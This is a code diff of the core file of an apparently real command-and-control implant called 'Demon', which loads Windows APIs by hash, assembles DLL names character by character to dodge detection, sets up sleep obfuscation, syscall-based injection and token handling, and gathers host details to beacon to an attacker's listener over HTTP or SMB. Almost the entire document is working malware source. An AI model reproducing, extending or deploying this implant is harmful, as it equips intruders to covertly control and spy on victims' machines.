@@ -1,20 +1,20 @@
 #include "Demon.h"
 
 /* Import Common Headers */
-#include "Common/Defines.h"
-#include "Common/Macros.h"
+#include <Common/Defines.h>
+#include <Common/Macros.h>
 
 /* Import Core Headers */
-#include "Core/Transport.h"
-#include "Core/SleepObf.h"
-#include "Core/WinUtils.h"
-#include "Core/MiniStd.h"
+#include <Core/Transport.h>
+#include <Core/SleepObf.h>
+#include <Core/WinUtils.h>
+#include <Core/MiniStd.h>
 
 /* Import Inject Headers */
-#include "Inject/Inject.h"
+#include <Inject/Inject.h>
 
 /* Import Inject Headers */
-#include "Loader/ObjectApi.h"
+#include <Loader/ObjectApi.h>
 
 /* Global Variables */
 INSTANCE Instance      = { 0 };
@@ -29,7 +29,6 @@ BYTE     AgentConfig[] = CONFIG_BYTES;
  * 4. Enter main connecting and tasking routine
  *
  * */
-_Noreturn
 VOID DemonMain( PVOID ModuleInst )
 {
     PUTS( "Start" )
@@ -63,7 +62,8 @@ VOID DemonMain( PVOID ModuleInst )
  *      F. Goto A (we have nothing else to execute then lets sleep and after waking up request for more)
  * 3. Sleep Obfuscation. After that lets try to connect to the listener again
  */
-_Noreturn VOID DemonRoutine()
+_Noreturn
+VOID DemonRoutine()
 {
     /* the main loop */
     for ( ;; )
@@ -74,6 +74,12 @@ _Noreturn VOID DemonRoutine()
             /* Connect to our listener */
             if ( TransportInit() )
             {
+
+#ifdef TRANSPORT_HTTP
+                /* reset the failure counter since we managed to connect to it. */
+                Instance.Config.Transport.Host->Failures = 0;
+#endif
+
                 /* Enter tasking routine */
                 CommandDispatcher();
             }
@@ -84,7 +90,7 @@ _Noreturn VOID DemonRoutine()
     }
 }
 
-/* Header also indicates that there we already used PackageNew or PackageCreate in the param Package (CommandCheckin) */
+/* Init metadata buffer/package. */
 VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
 {
     PVOID            Data       = NULL;
@@ -92,9 +98,14 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
     OSVERSIONINFOEXW OsVersions = { 0 };
     SIZE_T           Length     = 0;
 
-    /* Check we if wanna add the Agent Header + CommandID too */
+    /* Check we if we want to add the Agent Header + CommandID too */
     if ( Header )
+    {
         *MetaData = PackageCreate( DEMON_INITIALIZE );
+
+        /* Do not destroy this package if we fail to connect to the listener. */
+        ( *MetaData )->Destroy = FALSE;
+    }
 
     // create AES Keys/IV
     if ( Instance.Config.AES.Key == NULL && Instance.Config.AES.IV == NULL )
@@ -198,18 +209,18 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
         PackageAddInt32( *MetaData, 0 );
 
     // Get Process Path
-    Length = ( ( PRTL_USER_PROCESS_PARAMETERS ) Instance.ThreadEnvBlock->ProcessEnvironmentBlock->lpProcessParameters )->ImagePathName.Length;
+    Length = ( ( PRTL_USER_PROCESS_PARAMETERS ) Instance.Teb->ProcessEnvironmentBlock->ProcessParameters )->ImagePathName.Length;
     if ( ( Data = Instance.Win32.LocalAlloc( LPTR, Length ) ) )
     {
         Length = WCharStringToCharString(
                 Data,
-                ( ( PRTL_USER_PROCESS_PARAMETERS ) Instance.ThreadEnvBlock->ProcessEnvironmentBlock->lpProcessParameters )->ImagePathName.Buffer,
+                ( ( PRTL_USER_PROCESS_PARAMETERS ) Instance.Teb->ProcessEnvironmentBlock->ProcessParameters )->ImagePathName.Buffer,
                 Length
         );
         PackageAddBytes( *MetaData, Data, Length );
     } else PackageAddInt32( *MetaData, 0 );
 
-    PackageAddInt32( *MetaData, Instance.ThreadEnvBlock->ClientId.UniqueProcess );
+    PackageAddInt32( *MetaData, Instance.Teb->ClientId.UniqueProcess );
     PackageAddInt32( *MetaData, Instance.Session.PPID );
     PackageAddInt32( *MetaData, Instance.Session.ProcessArch );
     PackageAddInt32( *MetaData, BeaconIsAdmin( ) );
@@ -217,7 +228,6 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
     MemSet( &OsVersions, 0, sizeof( OsVersions ) );
     OsVersions.dwOSVersionInfoSize = sizeof( OsVersions );
     Instance.Win32.RtlGetVersion( &OsVersions );
-
     PackageAddInt32( *MetaData, OsVersions.dwMajorVersion );
     PackageAddInt32( *MetaData, OsVersions.dwMinorVersion );
     PackageAddInt32( *MetaData, OsVersions.wProductType );
@@ -236,7 +246,9 @@ VOID DemonInit( VOID )
     OSVERSIONINFOEXW             OSVersionExW     = { 0 };
     SYSTEM_PROCESSOR_INFORMATION SystemInfo       = { 0 };
 
-    Instance.ThreadEnvBlock = NtCurrentTEB();
+    MemSet( &Instance, 0, sizeof( INSTANCE ) );
+
+    Instance.Teb = NtCurrentTeb();
 
 #ifdef TRANSPORT_HTTP
     PUTS( "TRANSPORT_HTTP" )
@@ -246,8 +258,8 @@ VOID DemonInit( VOID )
     PUTS( "TRANSPORT_SMB" )
 #endif
 
-    Instance.Modules.Kernel32    = LdrModulePeb( HASH_KERNEL32 );
-    Instance.Modules.Ntdll       = LdrModulePeb( HASH_NTDLL );
+    Instance.Modules.Kernel32 = LdrModulePeb( HASH_KERNEL32 );
+    Instance.Modules.Ntdll    = LdrModulePeb( HASH_NTDLL );
 
     if ( ( ! Instance.Modules.Kernel32 ) || ( Instance.Modules.Ntdll ) )
     {
@@ -255,6 +267,7 @@ VOID DemonInit( VOID )
         Instance.Win32.LdrGetProcedureAddress              = LdrFunctionAddr( Instance.Modules.Ntdll, 0x2e5a99f6 );
         Instance.Win32.LdrLoadDll                          = LdrFunctionAddr( Instance.Modules.Ntdll, 0x307db23  );
         Instance.Win32.RtlAllocateHeap                     = LdrFunctionAddr( Instance.Modules.Ntdll, 0xc0b381da );
+        Instance.Win32.RtlReAllocateHeap                   = LdrFunctionAddr( Instance.Modules.Ntdll, 0xc0b381da );
         Instance.Win32.RtlFreeHeap                         = LdrFunctionAddr( Instance.Modules.Ntdll, 0x70ba71d7 );
         Instance.Win32.RtlExitUserThread                   = LdrFunctionAddr( Instance.Modules.Ntdll, 0x8e492b88 );
         Instance.Win32.RtlExitUserProcess                  = LdrFunctionAddr( Instance.Modules.Ntdll, 0x3aa1f0ef );
@@ -282,6 +295,7 @@ VOID DemonInit( VOID )
         Instance.Win32.CreatePipe                          = LdrFunctionAddr( Instance.Modules.Kernel32, 0x9a8deee7 );
         Instance.Win32.CreateProcessA                      = LdrFunctionAddr( Instance.Modules.Kernel32, 0xaeb52e19 );
         Instance.Win32.CreateFileW                         = LdrFunctionAddr( Instance.Modules.Kernel32, 0xeb96c610 );
+        Instance.Win32.GetFullPathNameW                    = LdrFunctionAddr( Instance.Modules.Kernel32, 0x3524e9fd );
         Instance.Win32.GetFileSize                         = LdrFunctionAddr( Instance.Modules.Kernel32, 0x7891c520 );
         Instance.Win32.CreateNamedPipeW                    = LdrFunctionAddr( Instance.Modules.Kernel32, 0x28fe1c03 );
         Instance.Win32.ConvertFiberToThread                = LdrFunctionAddr( Instance.Modules.Kernel32, 0x1f194e49 );
@@ -413,7 +427,7 @@ VOID DemonInit( VOID )
     else
 #endif
     {
-        PUTS( "Normal NTDLL" )
+        PUTS( "Using Native functions..." )
         Instance.Syscall.NtOpenProcess                     = LdrFunctionAddr( Instance.Modules.Ntdll, 0x5003c058 );
         Instance.Syscall.NtQueryInformationProcess         = LdrFunctionAddr( Instance.Modules.Ntdll, 0xd034fc62 );
         Instance.Syscall.NtQuerySystemInformation          = LdrFunctionAddr( Instance.Modules.Ntdll, 0xee4f73a8 );
@@ -442,152 +456,160 @@ VOID DemonInit( VOID )
         Instance.Syscall.NtQueryVirtualMemory              = LdrFunctionAddr( Instance.Modules.Ntdll, 0xe39d8e5d );
         Instance.Syscall.NtQueryInformationToken           = LdrFunctionAddr( Instance.Modules.Ntdll, 0x2ce5a244 );
         Instance.Syscall.NtQueryInformationThread          = LdrFunctionAddr( Instance.Modules.Ntdll, 0xc91f149b );
-        PUTS( "END OF NTDLL" )
     }
 
-    ModuleName[ 0 ]  = 'A';
-    ModuleName[ 2 ]  = 'V';
-    ModuleName[ 3 ]  = 'A';
-    ModuleName[ 1 ]  = 'D';
+    ModuleName[ 0 ] = 'A';
+    ModuleName[ 2 ] = 'V';
+    ModuleName[ 3 ] = 'A';
+    ModuleName[ 1 ] = 'D';
     ModuleName[ 8 ] = 0;
-    ModuleName[ 6 ]  = '3';
-    ModuleName[ 7 ]  = '2';
-    ModuleName[ 5 ]  = 'I';
-    ModuleName[ 4 ]  = 'P';
+    ModuleName[ 6 ] = '3';
+    ModuleName[ 7 ] = '2';
+    ModuleName[ 5 ] = 'I';
+    ModuleName[ 4 ] = 'P';
     Instance.Modules.Advapi32 = LdrModuleLoad( ModuleName );
 
-    ModuleName[ 0 ]  = 'C';
-    ModuleName[ 3 ]  = 'P';
-    ModuleName[ 5 ]  = '3';
+    ModuleName[ 0 ] = 'C';
+    ModuleName[ 3 ] = 'P';
+    ModuleName[ 5 ] = '3';
     ModuleName[ 7 ] = 0;
-    ModuleName[ 2 ]  = 'Y';
-    ModuleName[ 4 ]  = 'T';
-    ModuleName[ 1 ]  = 'R';
-    ModuleName[ 6 ]  = '2';
+    ModuleName[ 2 ] = 'Y';
+    ModuleName[ 4 ] = 'T';
+    ModuleName[ 1 ] = 'R';
+    ModuleName[ 6 ] = '2';
     Instance.Modules.Crypt32  = LdrModuleLoad( ModuleName );
 
-    ModuleName[1]  = 'S';
-    ModuleName[2]  = 'C';
-    ModuleName[0]  = 'M';
-    ModuleName[7] = 0;
-    ModuleName[3]  = 'o';
-    ModuleName[5]  = 'E';
-    ModuleName[6]  = 'E';
-    ModuleName[4]  = 'r';
+    ModuleName[ 1 ] = 'S';
+    ModuleName[ 2 ] = 'C';
+    ModuleName[ 0 ] = 'M';
+    ModuleName[ 7 ] = 0;
+    ModuleName[ 3 ] = 'o';
+    ModuleName[ 5 ] = 'E';
+    ModuleName[ 6 ] = 'E';
+    ModuleName[ 4 ] = 'r';
     Instance.Modules.Mscoree  = LdrModuleLoad( ModuleName );
 
-    ModuleName[3]  = 'A';
-    ModuleName[2]  = 'e';
-    ModuleName[0]  = 'O';
-    ModuleName[1]  = 'l';
-    ModuleName[5]  = 't';
-    ModuleName[7]  = '2';
-    ModuleName[6]  = '3';
-    ModuleName[4]  = 'u';
-    ModuleName[8] = 0;
+    ModuleName[ 3 ] = 'A';
+    ModuleName[ 2 ] = 'e';
+    ModuleName[ 0 ] = 'O';
+    ModuleName[ 1 ] = 'l';
+    ModuleName[ 5 ] = 't';
+    ModuleName[ 7 ] = '2';
+    ModuleName[ 6 ] = '3';
+    ModuleName[ 4 ] = 'u';
+    ModuleName[ 8 ] = 0;
     Instance.Modules.Oleaut32 = LdrModuleLoad( ModuleName );
 
-    ModuleName[1]  = 's';
-    ModuleName[0]  = 'U';
-    ModuleName[6] = 0;
-    ModuleName[5]  = '2';
-    ModuleName[3]  = 'r';
-    ModuleName[2]  = 'e';
-    ModuleName[4]  = '3';
+    ModuleName[ 1 ] = 's';
+    ModuleName[ 0 ] = 'U';
+    ModuleName[ 6 ] = 0;
+    ModuleName[ 5 ] = '2';
+    ModuleName[ 3 ] = 'r';
+    ModuleName[ 2 ] = 'e';
+    ModuleName[ 4 ] = '3';
     Instance.Modules.User32 = LdrModuleLoad( ModuleName );
 
-    ModuleName[0]  = 'S';
-    ModuleName[7] = 0;
-    ModuleName[6]  = '2';
-    ModuleName[4]  = 'l';
-    ModuleName[1]  = 'h';
-    ModuleName[5]  = '3';
-    ModuleName[3]  = 'l';
-    ModuleName[2]  = 'e';
+    ModuleName[ 0 ] = 'S';
+    ModuleName[ 7 ] = 0;
+    ModuleName[ 6 ] = '2';
+    ModuleName[ 4 ] = 'l';
+    ModuleName[ 1 ] = 'h';
+    ModuleName[ 5 ] = '3';
+    ModuleName[ 3 ] = 'l';
+    ModuleName[ 2 ] = 'e';
     Instance.Modules.Shell32   = LdrModuleLoad( ModuleName );
 
-    ModuleName[0]  = 'm';
-    ModuleName[6]  = 0;
-    ModuleName[4]  = 'r';
-    ModuleName[2]  = 'v';
-    ModuleName[3]  = 'c';
-    ModuleName[5]  = 't';
-    ModuleName[1]  = 's';
+    ModuleName[ 0 ] = 'm';
+    ModuleName[ 6 ] = 0;
+    ModuleName[ 4 ] = 'r';
+    ModuleName[ 2 ] = 'v';
+    ModuleName[ 3 ] = 'c';
+    ModuleName[ 5 ] = 't';
+    ModuleName[ 1 ] = 's';
     Instance.Modules.Msvcrt  = LdrModuleLoad( ModuleName );
 
-    ModuleName[0]  = 'k';
-    ModuleName[10]  = 0;
-    ModuleName[1]  = 'e';
-    ModuleName[2]  = 'r';
-    ModuleName[4]  = 'e';
-    ModuleName[3]  = 'n';
-    ModuleName[6]  = 'b';
-    ModuleName[8]  = 's';
-    ModuleName[9]  = 'e';
-    ModuleName[5]  = 'l';
-    ModuleName[7]  = 'a';
+    ModuleName[ 0 ]  = 'k';
+    ModuleName[ 10 ] = 0;
+    ModuleName[ 1 ]  = 'e';
+    ModuleName[ 2 ]  = 'r';
+    ModuleName[ 4 ]  = 'e';
+    ModuleName[ 3 ]  = 'n';
+    ModuleName[ 6 ]  = 'b';
+    ModuleName[ 8 ]  = 's';
+    ModuleName[ 9 ]  = 'e';
+    ModuleName[ 5 ]  = 'l';
+    ModuleName[ 7 ]  = 'a';
     Instance.Modules.KernelBase = LdrModuleLoad( ModuleName );
 
-    ModuleName[0]  = 'c';
-    ModuleName[1]  = 'r';
-    ModuleName[2]  = 'y';
-    ModuleName[3]  = 'p';
-    ModuleName[4]  = 't';
-    ModuleName[5]  = 's';
-    ModuleName[6]  = 'p';
-    ModuleName[7]  = 0;
+    ModuleName[ 0 ] = 'c';
+    ModuleName[ 1 ] = 'r';
+    ModuleName[ 2 ] = 'y';
+    ModuleName[ 3 ] = 'p';
+    ModuleName[ 4 ] = 't';
+    ModuleName[ 5 ] = 's';
+    ModuleName[ 6 ] = 'p';
+    ModuleName[ 7 ] = 0;
     Instance.Modules.CryptSp = LdrModuleLoad( ModuleName );
 
 #ifdef TRANSPORT_HTTP
-    ModuleName[0]  = 'w';
-    ModuleName[2]  = 'n';
-    ModuleName[7]  = 0;
-    ModuleName[4]  = 't';
-    ModuleName[1]  = 'i';
-    ModuleName[6]  = 'p';
-    ModuleName[3]  = 'h';
-    ModuleName[5]  = 't';
+    ModuleName[ 0 ] = 'w';
+    ModuleName[ 2 ] = 'n';
+    ModuleName[ 7 ] = 0;
+    ModuleName[ 4 ] = 't';
+    ModuleName[ 1 ] = 'i';
+    ModuleName[ 6 ] = 'p';
+    ModuleName[ 3 ] = 'h';
+    ModuleName[ 5 ] = 't';
     Instance.Modules.WinHttp = LdrModuleLoad( ModuleName );
 #endif
 
-    ModuleName[0]  = 'i';
-    ModuleName[8]  = 0;
-    ModuleName[2]  = 'h';
-    ModuleName[6]  = 'p';
-    ModuleName[1]  = 'p';
-    ModuleName[3]  = 'l';
-    ModuleName[5]  = 'a';
-    ModuleName[4]  = 'p';
-    ModuleName[7]  = 'i';
+    ModuleName[ 0 ] = 'i';
+    ModuleName[ 8 ] = 0;
+    ModuleName[ 2 ] = 'h';
+    ModuleName[ 6 ] = 'p';
+    ModuleName[ 1 ] = 'p';
+    ModuleName[ 3 ] = 'l';
+    ModuleName[ 5 ] = 'a';
+    ModuleName[ 4 ] = 'p';
+    ModuleName[ 7 ] = 'i';
     Instance.Modules.Iphlpapi = LdrModuleLoad( ModuleName );
 
-    ModuleName[4]  = '2';
-    ModuleName[5]  = 0;
-    ModuleName[2]  = 'i';
-    ModuleName[1]  = 'd';
-    ModuleName[0]  = 'g';
-    ModuleName[3]  = '3';
+    ModuleName[ 4 ] = '2';
+    ModuleName[ 5 ] = 0;
+    ModuleName[ 2 ] = 'i';
+    ModuleName[ 1 ] = 'd';
+    ModuleName[ 0 ] = 'g';
+    ModuleName[ 3 ] = '3';
     Instance.Modules.Gdi32 = LdrModuleLoad( ModuleName );
 
-    ModuleName[0]  = 'w';
-    ModuleName[4]  = 'l';
-    ModuleName[1]  = 'k';
-    ModuleName[6]  = 0;
-    ModuleName[2]  = 's';
-    ModuleName[3]  = 'c';
-    ModuleName[5]  = 'i';
+    ModuleName[ 0 ] = 'w';
+    ModuleName[ 4 ] = 'l';
+    ModuleName[ 1 ] = 'k';
+    ModuleName[ 6 ] = 0;
+    ModuleName[ 2 ] = 's';
+    ModuleName[ 3 ] = 'c';
+    ModuleName[ 5 ] = 'i';
     Instance.Modules.Wkscli = LdrModuleLoad( ModuleName );
 
-    ModuleName[0]  = 'N';
-    ModuleName[8]  = 0;
-    ModuleName[6]  = '3';
-    ModuleName[2]  = 't';
-    ModuleName[3]  = 'A';
-    ModuleName[4]  = 'p';
-    ModuleName[5]  = 'i';
-    ModuleName[1]  = 'e';
-    ModuleName[7]  = '2';
+    ModuleName[ 0 ] = 'N';
+    ModuleName[ 8 ] = 0;
+    ModuleName[ 6 ] = '3';
+    ModuleName[ 2 ] = 't';
+    ModuleName[ 3 ] = 'A';
+    ModuleName[ 4 ] = 'p';
+    ModuleName[ 5 ] = 'i';
+    ModuleName[ 1 ] = 'e';
+    ModuleName[ 7 ] = '2';
     Instance.Modules.NetApi32 = LdrModuleLoad( ModuleName );
+
+    ModuleName[ 0 ] = 'W';
+    ModuleName[ 1 ] = 's';
+    ModuleName[ 2 ] = '2';
+    ModuleName[ 3 ] = '_';
+    ModuleName[ 4 ] = '3';
+    ModuleName[ 5 ] = '2';
+    ModuleName[ 6 ] = 0;
+    Instance.Modules.Ws2_32 = LdrModuleLoad( ModuleName );
 
     MemSet( ModuleName, 0, 20 );
 
@@ -609,6 +631,14 @@ VOID DemonInit( VOID )
         Instance.Win32.AdjustTokenPrivileges               = LdrFunctionAddr( Instance.Modules.Advapi32, 0xce4cd9cb );
         Instance.Win32.LookupPrivilegeNameA                = LdrFunctionAddr( Instance.Modules.Advapi32, 0xe6176fe8 );
         Instance.Win32.SystemFunction032                   = LdrFunctionAddr( Instance.Modules.Advapi32, 0xcccf3585 );
+        Instance.Win32.FreeSid                             = LdrFunctionAddr( Instance.Modules.Advapi32, 0x2174ce07 );
+        Instance.Win32.SetSecurityDescriptorSacl           = LdrFunctionAddr( Instance.Modules.Advapi32, 0x4a8307ab );
+        Instance.Win32.SetSecurityDescriptorDacl           = LdrFunctionAddr( Instance.Modules.Advapi32, 0x4a7acdfc );
+        Instance.Win32.InitializeSecurityDescriptor        = LdrFunctionAddr( Instance.Modules.Advapi32, 0x70670cee );
+        Instance.Win32.AddMandatoryAce                     = LdrFunctionAddr( Instance.Modules.Advapi32, 0x248cc186 );
+        Instance.Win32.InitializeAcl                       = LdrFunctionAddr( Instance.Modules.Advapi32, 0x62cac4c7 );
+        Instance.Win32.AllocateAndInitializeSid            = LdrFunctionAddr( Instance.Modules.Advapi32, 0x57a4ccf  );
+        Instance.Win32.SetEntriesInAclW                    = LdrFunctionAddr( Instance.Modules.Advapi32, 0xe2d6b8e9 );
 
         PUTS( "Loaded Advapi32 functions" )
     }
@@ -675,17 +705,18 @@ VOID DemonInit( VOID )
 #ifdef TRANSPORT_HTTP
     if ( Instance.Modules.WinHttp )
     {
-        Instance.Win32.WinHttpOpen                         = LdrFunctionAddr( Instance.Modules.WinHttp,  0x5e4f39e5 );
-        Instance.Win32.WinHttpConnect                      = LdrFunctionAddr( Instance.Modules.WinHttp,  0x7242c17d );
-        Instance.Win32.WinHttpOpenRequest                  = LdrFunctionAddr( Instance.Modules.WinHttp,  0xeab7b9ce );
-        Instance.Win32.WinHttpSetOption                    = LdrFunctionAddr( Instance.Modules.WinHttp,  0xa18b94f8 );
-        Instance.Win32.WinHttpCloseHandle                  = LdrFunctionAddr( Instance.Modules.WinHttp,  0x36220cd5 );
-        Instance.Win32.WinHttpSendRequest                  = LdrFunctionAddr( Instance.Modules.WinHttp,  0xb183faa6 );
-        Instance.Win32.WinHttpAddRequestHeaders            = LdrFunctionAddr( Instance.Modules.WinHttp,  0xed7fcb41 );
-        Instance.Win32.WinHttpReceiveResponse              = LdrFunctionAddr( Instance.Modules.WinHttp,  0x146c4925 );
-        Instance.Win32.WinHttpWebSocketCompleteUpgrade     = LdrFunctionAddr( Instance.Modules.WinHttp,  0x58929db  );
-        Instance.Win32.WinHttpQueryDataAvailable           = LdrFunctionAddr( Instance.Modules.WinHttp,  0x34cb8684 );
-        Instance.Win32.WinHttpReadData                     = LdrFunctionAddr( Instance.Modules.WinHttp,  0x7195e4e9 );
+        Instance.Win32.WinHttpOpen                         = LdrFunctionAddr( Instance.Modules.WinHttp, 0x5e4f39e5 );
+        Instance.Win32.WinHttpConnect                      = LdrFunctionAddr( Instance.Modules.WinHttp, 0x7242c17d );
+        Instance.Win32.WinHttpOpenRequest                  = LdrFunctionAddr( Instance.Modules.WinHttp, 0xeab7b9ce );
+        Instance.Win32.WinHttpSetOption                    = LdrFunctionAddr( Instance.Modules.WinHttp, 0xa18b94f8 );
+        Instance.Win32.WinHttpCloseHandle                  = LdrFunctionAddr( Instance.Modules.WinHttp, 0x36220cd5 );
+        Instance.Win32.WinHttpSendRequest                  = LdrFunctionAddr( Instance.Modules.WinHttp, 0xb183faa6 );
+        Instance.Win32.WinHttpAddRequestHeaders            = LdrFunctionAddr( Instance.Modules.WinHttp, 0xed7fcb41 );
+        Instance.Win32.WinHttpReceiveResponse              = LdrFunctionAddr( Instance.Modules.WinHttp, 0x146c4925 );
+        Instance.Win32.WinHttpWebSocketCompleteUpgrade     = LdrFunctionAddr( Instance.Modules.WinHttp, 0x58929db  );
+        Instance.Win32.WinHttpQueryDataAvailable           = LdrFunctionAddr( Instance.Modules.WinHttp, 0x34cb8684 );
+        Instance.Win32.WinHttpReadData                     = LdrFunctionAddr( Instance.Modules.WinHttp, 0x7195e4e9 );
+        Instance.Win32.WinHttpQueryHeaders                 = LdrFunctionAddr( Instance.Modules.WinHttp, 0x389cefa5 );
 
         PUTS( "Loaded WinHttp functions" )
     }
@@ -714,39 +745,56 @@ VOID DemonInit( VOID )
         PUTS( "Loaded NetApi32 functions" )
     }
 
+    if ( Instance.Modules.Ws2_32 )
+    {
+        Instance.Win32.WSAStartup                          = LdrFunctionAddr( Instance.Modules.Ws2_32, 0x6128c683 );
+        Instance.Win32.WSACleanup                          = LdrFunctionAddr( Instance.Modules.Ws2_32, 0x7f1aab78 );
+        Instance.Win32.WSASocketA                          = LdrFunctionAddr( Instance.Modules.Ws2_32, 0x559f159a );
+        Instance.Win32.ioctlsocket                         = LdrFunctionAddr( Instance.Modules.Ws2_32, 0x6dcd609  );
+        Instance.Win32.bind                                = LdrFunctionAddr( Instance.Modules.Ws2_32, 0x7c9499e2 );
+        Instance.Win32.listen                              = LdrFunctionAddr( Instance.Modules.Ws2_32, 0xb794014  );
+        Instance.Win32.accept                              = LdrFunctionAddr( Instance.Modules.Ws2_32, 0xf15ae9b5 );
+        Instance.Win32.closesocket                         = LdrFunctionAddr( Instance.Modules.Ws2_32, 0x494cb104 );
+        Instance.Win32.recv                                = LdrFunctionAddr( Instance.Modules.Ws2_32, 0x7c9d4d95 );
+        Instance.Win32.send                                = LdrFunctionAddr( Instance.Modules.Ws2_32, 0x7c9ddb4f );
+
+        PUTS( "Loaded Ws2_32 functions" )
+    }
+
     PUTS( "Set basic info" )
 
     if ( ! NT_SUCCESS( Instance.Syscall.NtQuerySystemInformation( SystemProcessorInformation, &SystemInfo, sizeof( SYSTEM_PROCESSOR_INFORMATION ), 0 ) ) )
     PUTS( "[!] NtQuerySystemInformation Failed" );
 
     if ( ! Instance.Session.ModuleBase )
-        Instance.Session.ModuleBase    = ( ( PLDR_DATA_TABLE_ENTRY ) ( ( PPEB ) Instance.ThreadEnvBlock->ProcessEnvironmentBlock )->Ldr->InMemoryOrderModuleList.Flink )->Reserved2[ 0 ];
+        Instance.Session.ModuleBase = ( ( PLDR_DATA_TABLE_ENTRY ) ( ( PPEB ) Instance.Teb->ProcessEnvironmentBlock )->Ldr->InMemoryOrderModuleList.Flink )->DllBase;
 
-    Instance.Tokens.Vault              = NULL;
-    Instance.Tokens.Impersonate        = FALSE;
-    Instance.Jobs                      = NULL;
-    Instance.Session.OS_Arch           = SystemInfo.ProcessorArchitecture;
-    Instance.Session.PID               = Instance.ThreadEnvBlock->ClientId.UniqueProcess;
-    Instance.Session.ProcessArch       = PROCESS_AGENT_ARCH;
-    Instance.Session.Connected         = FALSE;
-    Instance.Session.AgentID           = RandomNumber32(); // generate a random ID
+    Instance.Session.OS_Arch     = SystemInfo.ProcessorArchitecture;
+    Instance.Session.PID         = Instance.Teb->ClientId.UniqueProcess;
+    Instance.Session.ProcessArch = PROCESS_AGENT_ARCH;
+    Instance.Session.Connected   = FALSE;
+    Instance.Session.AgentID     = RandomNumber32(); // generate a random ID
+    Instance.Config.AES.Key      = NULL;
+    Instance.Config.AES.IV       = NULL;
 
-    // Setting config
-    Instance.Config.AES.Key            = NULL;
-    Instance.Config.AES.IV             = NULL;
-    Instance.Config.Inject.Technique   = INJECTION_TECHNIQUE_SYSCALL; // default is just using syscalls
+    /* Linked lists */
+    Instance.Tokens.Vault        = NULL;
+    Instance.Tokens.Impersonate  = FALSE;
+    Instance.Jobs                = NULL;
+    Instance.Downloads           = NULL;
+    Instance.Sockets             = NULL;
+
+    /* Global Objects */
+    Instance.Dotnet = NULL;
 
     PRINTF( "Instance DemonID => %x\n", Instance.Session.AgentID )
-
-    Instance.Config.Implant.ThreadStartAddr = Instance.Win32.LdrLoadDll + 0x12; // TODO: default -> change that or make it optional via builder or profile
-
-    PUTS( "END" );
 }
 
 VOID DemonConfig()
 {
     PARSER Parser = { 0 };
     PVOID  Buffer = NULL;
+    ULONG  Temp   = 0;
     DWORD  Length = 0;
     DWORD  J      = 0;
 
@@ -787,35 +835,41 @@ VOID DemonConfig()
     )
 
     Instance.Config.Implant.SleepMaskTechnique = ParserGetInt32( &Parser );
+    Instance.Config.Implant.DownloadChunkSize  = 512000; /* 512k by default. */
 
     PRINTF(
-            "[CONFIG] Sleep Obfuscation: \n"
-            " - Technique: %d \n",
-            Instance.Config.Implant.SleepMaskTechnique
+        "[CONFIG] Sleep Obfuscation: \n"
+        " - Technique: %d \n",
+        Instance.Config.Implant.SleepMaskTechnique
     )
 
 #ifdef TRANSPORT_HTTP
-    Instance.Config.Transport.Method       = L"POST";
-    Instance.Config.Transport.HostRotation = ParserGetInt32( &Parser );
+    Instance.Config.Transport.Method         = L"POST";
+    Instance.Config.Transport.HostRotation   = ParserGetInt32( &Parser );
+    Instance.Config.Transport.HostMaxRetries = 10;  /* Max retries. */
+    Instance.Config.Transport.Hosts          = NULL;
+    Instance.Config.Transport.Host           = NULL;
 
+    /* J contains our Hosts counter */
     J = ParserGetInt32( &Parser );
-    Instance.Config.Transport.Hosts = Instance.Win32.LocalAlloc( LPTR, sizeof( LPWSTR ) * ( ( J + 1 ) * 2 ) );
-    PRINTF( "[CONFIG] Hosts [%d]:\n", J );
+    PRINTF( "[CONFIG] Hosts [%d]:", J )
     for ( INT i = 0; i < J; i++ )
     {
         Buffer = ParserGetBytes( &Parser, &Length );
-        Instance.Config.Transport.Hosts[ i ] = NtHeapAlloc( Length + sizeof( WCHAR ) )
-        MemCopy( Instance.Config.Transport.Hosts[ i ], Buffer, Length );
-#ifdef DEBUG
-        printf( "  - %ls\n", Instance.Config.Transport.Hosts[ i ] );
-#endif
-    }
-    Instance.Config.Transport.Hosts[ J + 1 ] = NULL;
-    Instance.Config.Transport.HostIndex      = 0;
+        Temp   = ParserGetInt32( &Parser );
 
-    // Listener Port
-    Instance.Config.Transport.Port = ParserGetInt32( &Parser );
-    PRINTF( "[CONFIG] Port: %d\n", Instance.Config.Transport.Port );
+        PRINTF( " - %ls:%ld\n", Buffer, Temp )
+
+        /* if our host address is longer than 0 then lets use it. */
+        if ( Length > 0 )
+            /* Add parse host data to our linked list */
+            HostAdd( Buffer, Length, Temp );
+    }
+    PRINTF( "Hosts added => %d\n", HostCount() )
+
+    /* Get Host data based on our host rotation strategy */
+    Instance.Config.Transport.Host = HostRotation( Instance.Config.Transport.HostRotation );
+    PRINTF( "Host going to be used is => %ls:%ld\n", Instance.Config.Transport.Host->Host, Instance.Config.Transport.Host->Port )
 
     // Listener Secure (SSL)
     Instance.Config.Transport.Secure = ParserGetInt32( &Parser );
@@ -904,5 +958,9 @@ VOID DemonConfig()
     PRINTF( "[CONFIG] PipeName: %ls\n", Instance.Config.Transport.Name );
 
 #endif
+
+    Instance.Config.Implant.ThreadStartAddr = Instance.Win32.LdrLoadDll + 0x12; /* TODO: default -> change that or make it optional via builder or profile */
+    Instance.Config.Inject.Technique        = INJECTION_TECHNIQUE_SYSCALL;
+
     ParserDestroy( &Parser );
 }
